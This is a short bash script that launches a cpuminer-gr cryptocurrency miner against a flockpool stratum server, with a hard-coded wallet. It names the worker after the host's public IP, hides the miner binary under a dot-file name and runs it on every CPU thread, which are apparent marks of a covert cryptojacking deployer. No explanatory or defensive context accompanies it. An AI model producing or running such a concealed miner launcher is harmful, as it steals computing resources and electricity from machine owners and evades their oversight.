#!/bin/bash

POOL=stratum+tcps://eu.flockpool.com:5555
WALLET=RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-dhoe

cd "$(dirname "$0")"

chmod +x ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRT11pEKPdwT3QGfWWJq3XzFjBDFxQygvU.dhoe -t $(nproc --all) --no-tune

